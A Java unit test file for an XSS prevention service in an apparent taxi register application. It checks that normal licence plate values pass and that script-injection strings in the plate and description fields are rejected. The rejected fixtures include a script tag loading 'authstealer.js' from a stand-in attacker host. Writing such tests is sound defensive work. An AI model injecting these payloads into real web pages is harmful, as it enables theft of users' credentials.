package uk.gov.caz.taxiregister.service;

import static org.assertj.core.api.Assertions.assertThat;
import static org.junit.jupiter.api.Assertions.assertDoesNotThrow;
import static org.junit.jupiter.api.Assertions.assertThrows;

import java.util.List;
import java.util.stream.Stream;
import org.assertj.core.util.Lists;
import org.junit.jupiter.api.BeforeEach;
import org.junit.jupiter.api.Test;
import org.junit.jupiter.params.ParameterizedTest;
import org.junit.jupiter.params.provider.MethodSource;
import org.junit.jupiter.params.provider.ValueSource;
import uk.gov.caz.taxiregister.controller.exception.SecurityThreatException;
import uk.gov.caz.taxiregister.dto.VehicleDto;
import uk.gov.caz.taxiregister.dto.Vehicles;

public class XssPreventionServiceTest {

  private XssPreventionService xssPreventionService;

  @BeforeEach
  public void setup() {
    xssPreventionService = new XssPreventionService();
  }

  private static Stream<String> licenceTypes() {
    return Stream.of("aaa", "bbb", "123",
        "anygoodtext", "", null);
  }

  private Vehicles fromLicensePlate(String licensePlate) {
    List<VehicleDto> vehicleList = Lists.newArrayList(VehicleDto.builder()
        .licensePlateNumber(licensePlate)
        .build());
    Vehicles vehicles = new Vehicles(vehicleList);
    return vehicles;
  }

  private Vehicles fromDescription(String description) {
    List<VehicleDto> vehicleList = Lists.newArrayList(VehicleDto.builder()
        .description(description)
        .build());
    Vehicles vehicles = new Vehicles(vehicleList);
    return vehicles;
  }

  @ParameterizedTest
  @MethodSource("uk.gov.caz.taxiregister.service.XssPreventionServiceTest#licenceTypes")
  public void doesNotThrowAnyErrorOnCorrectValues(String licensePlateNumber) {
    assertDoesNotThrow( () -> {
      xssPreventionService.checkVehicles(fromLicensePlate(licensePlateNumber));
    });
  }

  @ParameterizedTest
  @ValueSource(strings = {
      "<svg>onload</svg>",
      "I love the puppies! <script src=\"http://mallorysevilsite.com/authstealer.js\">",
      "I love the puppies! &lt;script src=\"http://mallorysevilsite.com/authstealer.js\"&gt;"
  })
  public void throwsErrorsOnXssAttempt(String licensePlateNumber) {
    assertThrows(SecurityThreatException.class, () -> {
      xssPreventionService.checkVehicles(fromLicensePlate(licensePlateNumber));
    });
  }

  @ParameterizedTest
  @ValueSource(strings = {
      "<svg>onload</svg>",
      "I love the puppies! <script src=\"http://mallorysevilsite.com/authstealer.js\">",
      "I love the puppies! &lt;script src=\"http://mallorysevilsite.com/authstealer.js\"&gt;"
  })
  public void throwsErrorsOnXssAttemptForDescription(String description) {
    assertThrows(SecurityThreatException.class, () -> {
      xssPreventionService.checkVehicles(fromDescription(description));
    });
  }
}
